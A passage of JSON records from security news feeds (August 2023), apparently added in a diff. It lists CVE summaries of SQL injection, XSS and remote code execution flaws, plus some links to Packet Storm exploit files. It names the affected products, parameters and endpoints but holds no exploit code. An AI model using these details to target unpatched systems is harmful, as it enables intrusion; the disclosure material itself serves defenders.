+    "message": "‼ CVE-2022-48593 ‼\n\nA SQL injection vulnerability exists in the â€œtopology data serviceâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39002 ‼\n\nA cross-site scripting (XSS) vulnerability in the act parameter of system_certmanager.php in OPNsense before 23.7 allows attackers to execute arbitrary web scripts or HTML via a crafted payload.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48589 ‼\n\nA SQL injection vulnerability exists in the â€œreporting job editorâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48596 ‼\n\nA SQL injection vulnerability exists in the â€œticket queue watchersâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39000 ‼\n\nA reflected cross-site scripting (XSS) vulnerability in the component /ui/diagnostics/log/core/ of OPNsense before 23.7 allows attackers to inject arbitrary JavaScript via the URL path.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48585 ‼\n\nA SQL injection vulnerability exists in the â€œadmin brand portalâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48587 ‼\n\nA SQL injection vulnerability exists in the â€œschedule editorâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48600 ‼\n\nA SQL injection vulnerability exists in the â€œnotes viewâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "defcon_news",
+    "message": "Dexx CMS HTML And Site Builder 2.2.3 XSS / Arbitrary File Upload\nhttps://packetstormsecurity.com/files/174076/dexxcmshsb223-upload.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174076/dexxcmshsb223-upload.txt"
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "defcon_news",
+    "message": "Deprixa 3.2.5 SQL Injection\nhttps://packetstormsecurity.com/files/174073/deprixa325-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174073/deprixa325-sql.txt"
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "defcon_news",
+    "message": "Chevereto CMS 3.7.0 SQL Injection\nhttps://packetstormsecurity.com/files/174069/cheveretocms370-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174069/cheveretocms370-sql.txt"
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-34545 ‼\n\nA SQL injection vulnerability in CSZCMS 1.3.0 allows remote attackers to run arbitrary SQL commands via p parameter or the search URL.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31450 ‼\n\nAn issue was discovered in Paessler PRTG Network Monitor 23.2.83.1760 x64. To exploit the vulnerability, a authenticated user can create a SQL Sensor. When creating this sensor, the user can set the SQL message that should be sent from the PRTG device. This input parameter contains a path traversal vulnerability that allows an attacker to choose arbitrary files from the system. They will be transmitted over the internet to the attacker's machine.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31449 ‼\n\nAn issue was discovered in Paessler PRTG Network Monitor 23.2.83.1760 x64. To exploit the vulnerability, a authenticated user can create a WMI Custom Sensor. When creating this sensor, the user can set the WQL message that should be sent from the PRTG device. This input parameter contains a path traversal vulnerability that allows an attacker to choose arbitrary files from the system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31448 ‼\n\nAn issue was discovered in Paessler PRTG Network Monitor 23.2.83.1760 x64. To exploit the vulnerability, a authenticated user can create a HL7 Sensor. When creating this sensor, the user can set the HL7 message that should be sent from the PRTG device. This input parameter contains a path traversal vulnerability that allows an attacker to choose arbitrary files from the system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37860 ‼\n\nIn PHOENIX CONTACTs WP 6xxx series web panels in versions prior to 4.0.10 a remote unauthenticated attacker can obtain the r/w community string of the SNMPv2 daemon.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-33934 ‼\n\nImproper Input Validation vulnerability in Apache Software Foundation Apache Traffic Server.This issue affects Apache Traffic Server: through 9.2.1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-47185 ‼\n\nImproper input validation vulnerability on the range header in Apache Software Foundation Apache Traffic Server.This issue affects Apache Traffic Server: through 9.2.1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23574 ‼\n\nA blind SQL Injection vulnerability in Nozomi Networks Guardian and CMC, due to improper input validation in the alerts_count component, allows an authenticated attacker to execute arbitrary SQL queries on the DBMS used by the web application.Authenticated users can extract arbitrary information from the DBMS in an uncontrolled way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-22378 ‼\n\nA blind SQL Injection vulnerability in Nozomi Networks Guardian and CMC, due to improper input validation in the sorting parameter, allows an authenticated attacker to execute arbitrary SQL queries on the DBMS used by the web application.Authenticated users can extract arbitrary information from the DBMS in an uncontrolled way.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36532 ‼\n\nBuffer overflow in Zoom Clients before 5.14.5 may allow an unauthenticated user to enable a denial of service via network access.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35371 ‼\n\nMicrosoft Office Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35388 ‼\n\nMicrosoft Exchange Server Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-29328 ‼\n\nMicrosoft Teams Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36911 ‼\n\nMicrosoft Message Queuing Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38184 ‼\n\nWindows Lightweight Directory Access Protocol (LDAP) Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35381 ‼\n\nWindows Fax Service Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38170 ‼\n\nHEVC Video Extensions Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35389 ‼\n\nMicrosoft Dynamics 365 On-Premises Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36892 ‼\n\nMicrosoft SharePoint Server Spoofing Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36893 ‼\n\nMicrosoft Outlook Spoofing Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36881 ‼\n\nAzure Apache AmbariÂ Spoofing Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36865 ‼\n\nMicrosoft Office Visio Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36866 ‼\n\nMicrosoft Office Visio Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36896 ‼\n\nMicrosoft Excel Remote Code Execution Vulnerability\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38761 ‼\n\nCross Site Scripting (XSS) vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to execute arbitrary code via a crafted payload to the systemSettings.php component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3386 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in a2 Camera Trap Tracking System allows SQL Injection.This issue affects Camera Trap Tracking System: before 3.1905.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38766 ‼\n\nCross Site Scripting (XSS) vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to execute arbitrary code via a crafted payload to the PersonView.php component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38760 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the role and gender parameters within the /QueryView.php component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38767 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the 'value' and 'custom' parameters within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38771 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the volopp parameter within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38764 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the birthmonth and percls parameters within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38769 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the searchstring and searchwhat parameters within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38768 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the PropertyID parameter within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38762 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the friendmonths parameter within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3522 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in a2 License Portal System allows SQL Injection.This issue affects License Portal System: before 1.48.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38773 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the volopp1 and volopp2 parameters within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38765 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the membermonth parameter within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38770 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the group parameter within the /QueryView.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38763 ‼\n\nSQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive information via the FundRaiserID parameter within the /FundRaiserEditor.php endpoint.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36306 ‼\n\nA Cross Site Scripting (XSS) vulnerability in Adiscon Aiscon LogAnalyzer through 4.1.13 allows a remote attacker to execute arbitrary code via the asktheoracle.php, details.php, index.php, search.php, export.php, reports.php, and statistics.php components.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3651 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Digital Ant E-Commerce Software allows SQL Injection.This issue affects E-Commerce Software: before 11.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "Virtues cpanelCMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174048/virtuescpanelcms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174048/virtuescpanelcms10-sql.txt"
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "eneblur CMS 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174046/eneblurcms10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174046/eneblurcms10-sql.txt"
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "CMS BMGI International 4.0 SQL Injection\nhttps://packetstormsecurity.com/files/174043/cmsbmgii40-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174043/cmsbmgii40-sql.txt"
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "EMIS WEB School CMS 1 SQL Injection\nhttps://packetstormsecurity.com/files/174040/emiswebschoolcms1-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174040/emiswebschoolcms1-sql.txt"
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "AMSS++ 6.11 SQL Injection\nhttps://packetstormsecurity.com/files/174033/amss611-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174033/amss611-sql.txt"
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23877 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in bkmacdaddy designs Pinterest RSS Widget plugin <=Â 2.3.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-27627 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in eggemplo Woocommerce Email Report plugin <=Â 2.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4219 ‼\n\nA vulnerability was found in SourceCodester Doctors Appointment System 1.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file login.php. The manipulation of the argument useremail leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-236365 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-23880 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in ExactMetrics plugin <=Â 7.14.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-45821 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in NooTheme Noo Timetable plugin <=Â 2.1.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30482 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in VillaTheme WPBulky plugin <=Â 1.0.10 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37688 ‼\n\nMaid Hiring Management System v1.0 was discovered to contain a SQL injection vulnerability in the Admin page.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25459 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Postsnippets Post Snippets plugin <=Â 4.0.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32292 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in GetButton Chat Button by GetButton.Io plugin <=Â 1.8.9.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3716 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Oduyo Online Collection Software allows SQL Injection.This issue affects Online Collection Software: before 1.0.1.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37690 ‼\n\nMaid Hiring Management System v1.0 was discovered to contain a SQL injection vulnerability in the Search Maid page.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25984 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Rigorous & Factory Pattern Dovetail plugin <=Â 1.2.13 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28773 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in Kolja Nolte Secondary Title plugin <=Â 2.0.9.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37684 ‼\n\nOnline Nurse Hiring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Search Report Details of the Admin portal.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37683 ‼\n\nOnline Nurse Hiring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Profile Page of the Admin.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37685 ‼\n\nOnline Nurse Hiring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Search Report Page of the Admin portal.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-27415 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Themeqx LetterPress plugin <=Â 1.1.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25063 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Anadnet Quick Page/Post Redirect Plugin plugin <=Â 5.2.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37686 ‼\n\nOnline Nurse Hiring System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in the Add Nurse Page in the Admin portal.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32503 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in GTmetrix GTmetrix for WordPress plugin <=Â 0.4.6 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3717 ‼\n\nImproper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Farmakom Remote Administration Console allows SQL Injection.This issue affects Remote Administration Console: before 1.02.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36692 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Christian Kramer & Hendrik Thole WP-Cirrus plugin <=Â 0.6.11 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37372 ‼\n\nA vulnerability has been identified in RUGGEDCOM CROSSBOW (All versions < V5.4). The affected applications is vulnerable to SQL injection. This could allow an unauthenticated remote attackers to execute arbitrary SQL queries on the server database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-29099 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in Elegant themes Divi theme <=Â 4.20.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28830 ‼\n\nA vulnerability has been identified in JT2Go (All versions < V14.2.0.5), Solid Edge SE2022 (All versions < V222.0 Update 13), Solid Edge SE2023 (All versions < V223.0 Update 4), Teamcenter Visualization V13.2 (All versions < V13.2.0.15), Teamcenter Visualization V13.3 (All versions < V13.3.0.11), Teamcenter Visualization V14.1 (All versions < V14.1.0.11), Teamcenter Visualization V14.2 (All versions < V14.2.0.5). The affected application contains a use-after-free vulnerability that could be triggered while parsing specially crafted ASM file. An attacker could leverage this vulnerability to execute code in the context of the current process.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39549 ‼\n\nA vulnerability has been identified in Solid Edge SE2023 (All versions < V223.0 Update 2). The affected application contains a use-after-free vulnerability that could be triggered while parsing specially crafted DWG file. An attacker could leverage this vulnerability to execute code in the context of the current process. (ZDI-CAN-19562)\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-36926 ‼\n\nDue to missing authentication check in SAP Host Agent - version 7.22, an unauthenticated attacker can set an undocumented parameter to a particular compatibility value and in turn call read functions. This allows the attacker to gather some non-sensitive information about the server.Â  There is no impact on integrity or availability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37488 ‼\n\nIn SAP NetWeaverÂ Process Integration - versions SAP_XIESR 7.50, SAP_XITOOL 7.50, SAP_XIAF 7.50, user-controlled inputs, if not sufficiently encoded, could result in Cross-Site Scripting (XSS) attack. On successful exploitation the attacker can causeÂ limited impact on confidentiality and integrity of the system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37483 ‼\n\nSAP PowerDesigner - version 16.7, has improper access control which might allow an unauthenticated attacker to run arbitrary queries against the back-end database via Proxy.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-08",
+    "from_channel": "defcon_news",
+    "message": "TikTok: Dom XSS and open redirect in TikTok seller endpoint\nhttps://vulners.com/hackerone/H1:2007093?utm_source=rss&utm_medium=rss&utm_campaign=rss",
+    "urls": [],
+    "webpage_description": "A TikTok seller endpoint had a cross-site scripting (XSS) vulnerability via the \"hack_redirect_now\" parameter, caused by the reflection of user-supplied data without proper HTML escaping or output encoding. This vulnerability has been resolved. We...",
+    "webpage_url": "https://vulners.com/hackerone/H1:2007093?utm_source=rss&utm_medium=rss&utm_campaign=rss"
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39524 ‼\n\nPrestaShop is an open source e-commerce web application. Prior to version 8.1.1, SQL injection possible in the product search field, in BO's product page. Version 8.1.1 contains a patch for this issue. There are no known workarounds.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4201 ‼\n\nA vulnerability was found in SourceCodester Inventory Management System 1.0 and classified as critical. This issue affects some unknown processing of the file ex_catagory_data.php. The manipulation of the argument columns[1][data] leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-236291.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-07",
+    "from_channel": "cibsecurity",
